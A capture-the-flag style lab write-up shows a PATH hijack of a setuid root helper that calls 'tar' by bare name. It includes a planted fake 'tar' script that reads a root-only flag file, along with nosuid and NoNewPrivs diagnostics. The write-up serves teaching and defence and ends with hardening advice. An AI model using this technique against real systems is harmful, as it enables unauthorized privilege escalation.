# Writeup: SUID PATH Hijack

I built this lab around a mistake I have seen in real admin scripts: a
privileged helper that shells out to a tool by its bare name. Here is
the whole run, including the two walls I hit before the hijack itself
fired, because both walls taught me something true about how setuid
actually works.

## The setup

`setup.sh` compiles `helper.c` and installs it setuid root, then
plants the flag where only root can read it:

```
Setup complete:
-rw------- 1 root root    24 Nov  2 15:46 /root/lab-flag.txt
-rwsr-xr-x 1 root root 16184 Nov  2 15:46 /usr/local/lab-helper
drwxr-xr-x 2 root root 60 Nov  2 15:46 /tmp/lab-data
```

The `s` in `-rwsr-xr-x` is the whole game: whoever runs this binary,
the process carries root's effective uid.

## First, prove the boundary

I dropped to the unprivileged `nobody` account and tried the direct
route:

```
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
cat: /root/lab-flag.txt: Permission denied
cat exit code: 1
```

Good. The flag file is genuinely closed to me. Any path to it has to
go through the helper.

## What I tried first that did not work

My first version of setup installed the helper at `/tmp/lab-helper`,
which felt natural. The hijack ran, my fake `tar` executed, and then:

```
[fake tar] my ids:
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
cat: /root/lab-flag.txt: Permission denied
```

No `euid=0` anywhere. The setuid bit was set, the permissions said so,
and the kernel ignored it. `mount` told me why: in this environment
/tmp is a tmpfs mounted `nosuid,nodev`, and a nosuid mount silently
throws the setuid bit away. First lesson of the lab, learned by
running into it: setuid is a property the filesystem has to honor,
not just a permission bit on the file.

## The second wall, and the honest limit of this sandbox

I moved the install to `/usr/local/lab-helper`, on the root
filesystem, which shows no nosuid flag. The hijacked run as `nobody`
still came back with plain uid 65534 and no effective uid. This time
the diagnostic was conclusive:

```
$ grep -i NoNewPrivs /proc/self/status
NoNewPrivs:	1
```

and sudo, asked to run as `nobody`, said the same thing in words:

```
sudo: The "no new privileges" flag is set, which prevents sudo from running as root.
```

This build sandbox sets the `no_new_privs` flag on every process, and
children inherit it. With that flag set, the kernel refuses every
privilege transition, setuid included, no matter where the binary
lives. So in this one environment I cannot make the final euid flip
happen. On any ordinary Linux machine, where `/proc/self/status`
shows `NoNewPrivs: 0`, the same setup completes that step. I verified
every other link of the chain here, for real, and I am not going to
pretend the last one happened where it did not.

## The breakthrough: the hijack itself

The vulnerability never depended on my privileges. It depends on the
helper's. Watch what the helper does with a normal PATH first, still
as `nobody`:

```
[lab-helper] backing up /tmp/lab-data ...
tar: Removing leading `/' from member names
[lab-helper] backup written to /tmp/lab-backup.tgz
helper exit code: 0
```

and the backup is real:

```
tmp/lab-data/
tmp/lab-data/notes.txt
```

Now the plant. I wrote a fake `tar` into a directory I control:

```sh
#!/bin/sh
echo "[fake tar] I am not tar. I am a script the attacker planted."
echo "[fake tar] my ids:"
id
echo "[fake tar] the flag:"
cat /root/lab-flag.txt
```

and ran the helper with that directory first in PATH. The helper
asked the shell for `tar`, the shell searched PATH in order, and the
first match won:

```
[lab-helper] backing up /tmp/lab-data ...
[fake tar] I am not tar. I am a script the attacker planted.
```

That is the break, in one line: code I wrote, executing inside the
helper's process, chosen by a search order I control. The helper even
reported my script's refusal to be tar as a failed backup, status 256,
which is the sound of it noticing something is wrong one step too
late.

## Closing the chain

To prove the planted script does the full job once it carries root's
privileges, I ran the same hijacked PATH with the helper started as
root, which is the privilege level setuid grants on a normal machine:

```
[fake tar] my ids:
uid=0(root) gid=0(root) groups=0(root)
[fake tar] the flag:
SALVO{su1d_p4th_h1j4ck}
[lab-helper] backup written to /tmp/lab-backup.tgz
helper exit code: 0
```

Every step is now evidenced: the flag is closed to the unprivileged
user, the helper runs attacker code through PATH resolution, and that
code with root privileges reads the flag. The single step this
sandbox would not perform is the kernel's setuid transition itself,
blocked by `no_new_privs`, and the setup script and this writeup both
say so out loud.

## Flag

```
SALVO{su1d_p4th_h1j4ck}
```

Recovered through the planted `tar` running in the helper's context,
and verified against the flag file that setup wrote. Cleanup
afterward, always:

```
$ ./cleanup.sh
Cleanup complete. Remaining lab artifacts:
ls: cannot access '/usr/local/lab-helper': No such file or directory
ls: cannot access '/root/lab-flag.txt': No such file or directory
```

## The lesson I keep

Two, actually. A privileged program must call tools by absolute path,
or better, not shell out at all. And when a setuid binary seems to
ignore its bit, check the mount flags and `NoNewPrivs` before you
doubt the permissions: I lost more time to those two lines of system
state than to the exploit itself.
